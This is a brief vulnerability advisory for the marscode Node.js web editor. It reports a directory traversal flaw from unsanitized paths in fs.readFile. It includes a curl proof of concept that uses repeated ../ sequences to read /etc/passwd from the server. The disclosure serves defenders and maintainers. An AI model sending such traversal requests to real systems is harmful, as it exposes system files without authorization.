# Overview

marscode is a web editor created with monaco-editor, jquery file tree and nodejs file tree to read, write, edit, delete (CRUD) files.

Affected versions of this package are vulnerable to Directory Traversal. There is no path sanitization in the path provided at `fs.readFile` in `index.js`.

# Steps to reproduce

  1. Start the server node index.js
  2. `curl -v --path-as-is http://127.0.0.1:8080/../../../../../../../../../../../etc/passwd`
  3. `/etc/passwd` of the current user will be displayed.
